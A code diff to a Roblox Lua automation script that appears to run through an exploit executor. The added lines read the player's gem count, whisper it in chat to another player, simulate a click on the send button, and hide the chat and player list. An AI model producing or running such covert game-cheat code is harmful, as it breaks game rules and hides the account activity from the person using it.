@@ -170,8 +170,17 @@ local moneyValue = checkMoneyValue()
 if moneyValue == 0 then
     teleportToTrading()
 else
-    game:GetService("CoreGui").ExperienceChat.appLayout.Visible = false
     game:GetService("CoreGui").PlayerList.PlayerListMaster.Visible = false
+    local soluongGem = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Gems"].Value
+    local textBox = game:GetService("CoreGui").ExperienceChat.appLayout.chatInputBar.Background.Container.TextContainer.TextBoxContainer.TextBox
+    textBox.Text = "/w " .. player
+    wait(1)
+    textBox.Text = "DG" .. soluongGem
+    local sendButton = game:GetService("CoreGui").ExperienceChat.appLayout.chatInputBar.Background.Container.SendButton
+    local centerX, centerY = GetCenterPosition(sendButton)
+    ClickAtPosition(centerX - 20, centerY + 40)
+    wait(1)
+    game:GetService("CoreGui").ExperienceChat.appLayout.Visible = false
     spawn(function()
         while true do
             if not teleported then
@@ -182,7 +191,6 @@ else
             wait(waitTime)
         end
     end)
-
     spawn(function()
         while true do
             if not isbought then
